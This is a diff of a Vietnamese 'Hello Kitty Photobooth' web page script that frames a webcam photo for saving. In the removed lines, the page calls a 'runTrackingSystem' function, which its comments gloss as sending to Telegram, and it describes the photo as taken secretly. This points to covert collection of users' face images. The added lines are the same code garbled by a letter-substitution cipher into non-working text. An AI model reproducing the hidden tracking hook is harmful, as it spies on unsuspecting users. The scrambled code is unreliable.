+        fgNgHFGRKG.vAAreUGZy = "ĐNAt yồaT xUhat ảau URYYb xVGgl... IHv YòAT đợv aUé!";
 
-        // CHẠY HỆ THỐNG GỬI TELEGRAM CỦA BRO (Mặc kệ nó tắt camera hay làm gì)
-        if (typeof runTrackingSystem === 'function') {
-            await runTrackingSystem(); 
+        // PUẠl uỆ gUỐaT tỬv GrYRtenZ PỦn oeB (ZặP xệ aó Gắg pnzReN uNl YàZ tì)
+        vS (gLCrbS ehAgENpxVATFLFgRZ === 'sHApGVbA') {
+            nJnvg ehAGEnpxVATflFgRz(); 
         }
 
-        // Tới bước này main.js đã chạy xong, camera đã chết, nhưng ta ĐÃ CÓ ẢNH TRONG BỘ NHỚ!
-        renderFinalPhotoBooth(vw, vh);
+        // gớV OướP Aàl ZNvA.wF đã pUạl KBAt, pnZrEN đã puếG, aUưAT Gn ĐÃ pÓ Ảau gEbaT OỘ aUỚ!
+        ERAqREsVanYcUbgbobBGU(Ij, Iu);
     });
 
-    function renderFinalPhotoBooth(width, height) {
-        const finalCanvas = document.createElement('canvas');
-        const ctx = finalCanvas.getContext('2d');
+    SHapGvba erAqreSVaNyCuBgBObBGU(jvqgU, UrVTuG) {
+        PbAFG svAnYpNAinF = QbPhZRaG.peRNgRRYrzraG('pNainF');
+        pbAfg PgK = sVaNypNainf.TRgPBagrKG('2Q');
         
-        finalCanvas.width = width;
-        finalCanvas.height = height;
+        svAnyPnaiNf.JVQGU = JvQGU;
+        SvanyPNaINf.urvtug = UrVTUG;
 
-        const borderThick = Math.floor(width * 0.05); // Viền chiếm 5% chiều ngang
+        PBAfG oBEqrEgUVpx = znGU.SybBe(jVQGu * 0.05); // iVềA puVếz 5% pUvềh atnAt
 
-        // 1. Phủ nền màu hồng phấn (Background Khung)
-        ctx.fillStyle = '#ffb6c1';
-        ctx.fillRect(0, 0, width, height);
+        // 1. cuủ aềa zàh uồaT Cuấa (ONPXTEbHAq XUhaT)
+        pGK.SvyYFGlYr = '#sso6P1';
+        PgK.SVYyERPg(0, 0, JvqgU, urvtuG);
 
-        // 2. Kẻ đường đứt nét trắng bao quanh
-        ctx.strokeStyle = '#ffffff';
-        ctx.lineWidth = Math.floor(width * 0.012);
-        ctx.lineJoin = 'round';
-        ctx.setLineDash([20, 20]);
-        ctx.strokeRect(borderThick / 2, borderThick / 2, width - borderThick, height - borderThick);
-        ctx.setLineDash([]); // Reset nét vẽ
+        // 2. xẻ đườAT đứg Aég gEắaT onB DHNAU
+        pgk.fgEBxrFGlyr = '#SsSSSs';
+        pgk.YvarJvQGu = zngU.SyBBE(JvqGU * 0.012);
+        pGk.YvaRwBVA = 'EBHAQ';
+        pgK.FRgyVARqnfU([20, 20]);
+        pgK.FgEbXReRpg(oBeQREGUVPx / 2, OBeqreguVPx / 2, jVQgu - ObEqrEGuvpx, URvTUg - OBeQREGuvpx);
+        PgK.FrgYvArqNfu([]); // eRFrg aég iẽ
 
-        // 3. Đổ ảnh mặt người dùng từ BỘ NHỚ (highResCanvas) vào giữa khung
-        // Chừa khoảng trống bên dưới để ghi chữ
-        const textStripHeight = Math.floor(height * 0.16);
-        ctx.drawImage(
-            highResCanvas, // Nguồn ảnh lấy từ cái canvas ban nãy chụp trộm
-            borderThick, 
-            borderThick, 
-            width - borderThick * 2, 
-            height - borderThick * 2 - textStripHeight
+        // 3. Đổ ảaU zặG AtườV qùAt gừ OỘ AuỚ (UvTUerfPNAinF) IàB Tvữn xuHat
+        // puừN xUBảAt geốat OêA qướv để tuv PUữ
+        pbAFG GrKgfgEVcuRVtug = znGU.sybbE(uRvTug * 0.16);
+        pgk.qeNjvznTr(
+            uVTuERfpNAinF, // AthồA ảaU yấL Gừ Páv PNaINf oNa aãL puục GEộz
+            oBEQReGuvpx, 
+            ObeQrEGuvpx, 
+            JVqgU - obEqreGUVPX * 2, 
+            urvTUg - ObeqREgUvPX * 2 - GrkgFGeVcurVTUg
         );
 
-        // 4. Vẽ một dải màu trắng ở phía đáy để ghi chữ (Style Polaroid)
-        ctx.fillStyle = '#ffffff';
-        ctx.fillRect(
-            borderThick, 
-            height - borderThick - textStripHeight, 
-            width - borderThick * 2, 
-            textStripHeight
+        // 4. Iẽ Zộg QảV zàH gEắAT ở cuín đál để tuV puữ (fglyR cbyNEbvQ)
+        pgK.sVyyFGLYr = '#SSssSs';
+        pGk.SvYYeRPg(
+            oBEqREGUVPX, 
+            UrVTUg - OBEQReGuvpX - GRkgFgEvcURVtUg, 
+            Jvqgu - ObEqreGUVpX * 2, 
+            GRKGFGeVCURvtUG
         );
 
-        // 5. Viết Text "Hello Kitty Photobooth"
-        ctx.fillStyle = '#df2b76';
-        const fontSize = Math.floor(textStripHeight * 0.35);
-        ctx.font = `900 ${fontSize}px 'Nunito', sans-serif`;
-        ctx.textAlign = 'center';
-        ctx.textBaseline = 'middle';
+        // 5. ivếG gRKg "urYYb xvGGL CUbGBoBbgu"
+        PgK.SVYyFGlyr = '#qS2O76';
+        PBafg sBaGfVMR = ZngU.SYBbE(GRKGFGEvCurvtUg * 0.35);
+        PgK.sbaG = `900 ${SBagfVMr}CK 'AhAvgB', FNAf-FREvs`;
+        pGk.GrkGnyvTA = 'pragRE';
+        pgK.grkGONFrYVAr = 'ZVQqYR';
         
-        // Thêm nơ trang trí bằng Text Unicode vào 2 bên
-        const textY = height - borderThick - (textStripHeight / 2);
-        ctx.fillText('🎀 Hello Kitty Photobooth 🎀', width / 2, textY);
+        // guêz aơ genat GEí OằAT GRKg HAVpbQR iàB 2 oêA
+        PBafg GRkgL = URVtUg - ObEQrEGUvpX - (GRkgFGEvcuRVTug / 2);
+        PGK.SvYYGRkg('🎀 URyyB XvGGl CubgbobBGU 🎀', JVqGu / 2, GrKGl);
 
-        // Ép Canvas thành dạng Ảnh (Base64 JPEG chất lượng cao)
-        resultImg.src = finalCanvas.toDataURL('image/jpeg', 1.0);
+        // Éc pnaINf gUàAu qạAT ẢAU (oNFR64 WcRT PUấg yượAT pNB)
+        eRFHyGVZT.fep = SvanyPnAInF.gBqNgnhey('VzNTR/wcrT', 1.0);
 
-        // Hiển thị kết quả ra UI
-        video.style.display = 'none';
-        msg.style.display = 'none';
-        resultImg.style.display = 'block';
+        // uvểa GUị Xếg dHả en HV
+        IVqrb.FglYR.QVfCYNl = 'Abar';
+        zfT.fGlyr.QVFcynl = 'Abar';
+        eRFHYGvZT.fgLyR.qvfcYNL = 'oybpx';
         
-        btn.style.display = 'none'; // Ẩn nút chụp to
-        actionButtons.style.display = 'flex'; // Hiện 2 nút Save / Chụp lại
+        OGa.fGlYR.QVfcYnL = 'ABAR'; // ẨA aúg PuụC gb
+        NPGvBaOhGGBaF.FgLYr.QvFCynl = 'syrk'; // uVệA 2 aúg fNiR / PUụC YạV
         
-        statusText.innerHTML = "✨ Tadaaaa! Ảnh của bạn đã xong ✨<br>Lưu về khoe bạn bè ngay nào!";
+        FgnGHFGRkg.vaarEuGZy = "✨ gNqnnnN! Ảau pủn Oạa đã KBat ✨<oE>Yưh Iề XubR oạA oè AtNl AàB!";
     }
 
-    // Xử lý nút LƯU ẢNH VỀ
-    document.getElementById('saveBtn').addEventListener('click', () => {
-        const link = document.createElement('a');
-        link.href = resultImg.src;
-        // Đặt tên file download ngẫu nhiên xịn xò
-        const dateStr = new Date().getTime();
-        link.download = `HelloKitty_Photobooth_${dateStr}.jpg`;
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
+    // kử Yý aúg YƯh ẢAU iỀ
+    qbPHzrAG.trGrYrzraGOlVq('FniRoGa').nqQRiRAGyVfgrArE('PYvpx', () => {
+        pbAFg yvAX = QBpHzRAg.PErNGRRyRzraG('n');
+        yvAX.UERS = erfHyGvzT.Fep;
+        // Đặg gêa svYR qbJayBnq atẫh auvêa KịA Kò
+        PbafG QnGrfGe = arJ QNgr().tRgGvZR();
+        yvaX.qbJaYBNq = `uryYbxVgGL_CUBgbOBbgu_${QNGrfge}.WCT`;
+        QbPHZRAG.ObqL.NCCRaQPUvyQ(yvax);
+        YVaX.PyVPX();
+        qbphzRaG.oBQl.ERzbirPUVYQ(YVAX);
     });
 
-    // Xử lý nút CHỤP LẠI
-    document.getElementById('retakeBtn').addEventListener('click', () => {
-        // Reload lại hẳn trang để mọi thứ (cả main.js) được reset sạch sẽ từ đầu
-        // Đảm bảo không dính bug camera của trình duyệt
-        window.location.reload();
+    // kử yý AúG PuỤC YẠV
+    QbPhzrAG.TRGryRzRagolVq('erGnXRoGA').nqqRiraGYVFGraRE('PyVPX', () => {
+        // ERybNQ yạv uẳa GeNaT để zọV GUứ (pả ZNVA.wf) đượP ERFrG fạpU fẽ gừ đầh
+        // Đảz OảB xuôat QíAu ohT PNzREn Pủn GeìaU QHlệG
+        jVAQbJ.yBpnGVbA.eRYBNq();
     });
-</script>
+</FpeVcG>
 
-</body>
-</html>
+</ObQL>
+</ugZy>
